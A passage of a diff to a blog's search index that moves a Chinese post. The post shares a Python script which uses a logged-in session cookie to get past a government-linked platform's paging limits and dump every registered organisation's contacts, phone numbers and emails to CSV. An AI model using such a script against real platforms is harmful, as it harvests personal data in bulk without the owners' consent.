class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_users</span>(<span class="params">count</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;http://dc.gov110.cn//usercenter/overviewUserList&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;currentPage&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;maxResults&#x27;</span>: count</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.request(<span class="string">&#x27;POST&#x27;</span>, url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">return</span> req.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_text</span>(<span class="params">text</span>):</span></span><br><span class="line">    html = etree.HTML(text)</span><br><span class="line">    result = html.xpath(<span class="string">&#x27;//*[@id=&quot;user_list_table&quot;]/tbody/tr&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">yield</span> x.xpath(<span class="string">&#x27;td[0]/text()|td[1]/text()|td[2]/text()|td[3]/text()|td[5]/text()|td[6]/text()|td[7]/text()|td[8]/text()|td[9]/text()&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> headers</span><br><span class="line">    headers =&#123;</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;y=&#123;&#125;;&#x27;</span>.format(sys.argv[<span class="number">1</span>])</span><br><span class="line">    &#125;</span><br><span class="line">    count = get_count()</span><br><span class="line">    print(<span class="string">&#x27;[*]用户总数：%s 加载中.....&#x27;</span> % count)</span><br><span class="line">    html = get_users(count)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;result.csv&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;注册时间,单位名称,所属地区,市,区/县,服务器数,网站数,联系电话,邮箱,联系人\n&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;[*]正在写入文件....&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> print_text(html):</span><br><span class="line">            tmp = str(i).strip(<span class="string">&#x27;[&#x27;</span>).strip(<span class="string">&#x27;]&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            f.write(tmp)</span><br><span class="line">        print(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">usage : main.py 51F819DC83C...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">info:</span></span><br><span class="line"><span class="string">请登陆dc.gov110.cn后获取cookie中的y值，并以此值作为该脚本启动参数运行</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main()</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/GuoKerS/Some_Script/tree/master/getUserList_dcgov110">getUserList</a></p>
+]]></content>
       <tags>
         <tag>Python</tag>
-        <tag>渗透</tag>
-        <tag>运维</tag>
       </tags>
   </entry>
   <entry>
@@ -878,20 +892,6 @@
 ]]></content>
       <tags>
         <tag>杂项</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>获取级联平台所有用户信息的小脚本</title>
-    <url>/%E8%8E%B7%E5%8F%96%E7%BA%A7%E8%81%94%E5%B9%B3%E5%8F%B0%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E7%9A%84%E5%B0%8F%E8%84%9A%E6%9C%AC/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个在级联平台上获取全部用户信息的小脚本，由于平台自身的安全设置较为严格导致无法短时间内多次点击下一页查看信息（一页十条），因此使用F12大法分析到了用户信息的接口，通过对参数的调试得到了一条请求获取全部用户信息的方法，但由于接口返回的并不是json格式，而是直接返回html的内容，所以这里还调用了第三方库lxml对html经行解析，最后将用户信息保存成表格。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install lxml # 安装第三方库</span><br></pre></td></tr></table></figure>
-<p><img src="https://photo.o0o0.club/_README.md/1583678845788.png"></p>
-<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_count</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;http://dc.gov110.cn/control_center/controlCenterIndex/getRegisterGovUserCount&#x27;</span></span><br><span class="line">    req = requests.request(<span class="string">&#x27;POST&#x27;</span>, url, headers=headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;totalUserCount&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="keyword">return</span> req.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;totalUserCount&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-]请检测cookie中y值是否正确！&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_users</span>(<span class="params">count</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;http://dc.gov110.cn//usercenter/overviewUserList&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;currentPage&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;maxResults&#x27;</span>: count</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.request(<span class="string">&#x27;POST&#x27;</span>, url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">return</span> req.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_text</span>(<span class="params">text</span>):</span></span><br><span class="line">    html = etree.HTML(text)</span><br><span class="line">    result = html.xpath(<span class="string">&#x27;//*[@id=&quot;user_list_table&quot;]/tbody/tr&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">yield</span> x.xpath(<span class="string">&#x27;td[0]/text()|td[1]/text()|td[2]/text()|td[3]/text()|td[5]/text()|td[6]/text()|td[7]/text()|td[8]/text()|td[9]/text()&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> headers</span><br><span class="line">    headers =&#123;</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;y=&#123;&#125;;&#x27;</span>.format(sys.argv[<span class="number">1</span>])</span><br><span class="line">    &#125;</span><br><span class="line">    count = get_count()</span><br><span class="line">    print(<span class="string">&#x27;[*]用户总数：%s 加载中.....&#x27;</span> % count)</span><br><span class="line">    html = get_users(count)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;result.csv&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;注册时间,单位名称,所属地区,市,区/县,服务器数,网站数,联系电话,邮箱,联系人\n&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;[*]正在写入文件....&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> print_text(html):</span><br><span class="line">            tmp = str(i).strip(<span class="string">&#x27;[&#x27;</span>).strip(<span class="string">&#x27;]&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            f.write(tmp)</span><br><span class="line">        print(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">usage : main.py 51F819DC83C...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">info:</span></span><br><span class="line"><span class="string">请登陆dc.gov110.cn后获取cookie中的y值，并以此值作为该脚本启动参数运行</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main()</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://github.com/GuoKerS/Some_Script/tree/master/getUserList_dcgov110">getUserList</a></p>
-]]></content>
-      <tags>
-        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
